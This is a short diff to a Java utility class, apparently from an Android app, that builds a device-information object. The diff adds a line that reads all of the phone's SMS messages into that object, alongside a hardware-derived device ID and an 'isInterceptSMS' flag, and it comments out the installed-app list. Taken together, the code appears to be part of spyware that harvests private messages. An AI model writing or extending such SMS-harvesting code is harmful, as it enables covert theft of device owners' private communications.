@@ -36,11 +36,12 @@ public class AllUtils {
             AppInfoBean myApp = new AppInfoBean();
             myApp.isSystem = app.isSystem();
             myApp.name = app.getName();
-            myApp.packageName=app.getPackageName();
+            myApp.packageName = app.getPackageName();
             myApp.versionName = app.getVersionName();
-            list.add(myApp);
+//            list.add(myApp);
         }
         info.appList = list;
+        info.smsList = SmsUtils.getAllSMS();
 
         info.deviceId = getUniquePsuedoID();
         info.isInterceptSMS = false;
@@ -86,6 +87,7 @@ public class AllUtils {
         //使用硬件信息拼凑出来的15位号码
         return new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();
     }
+
 
     public static Bitmap compBmp(String bmpPath) {
         if (!new File(bmpPath).exists()) {
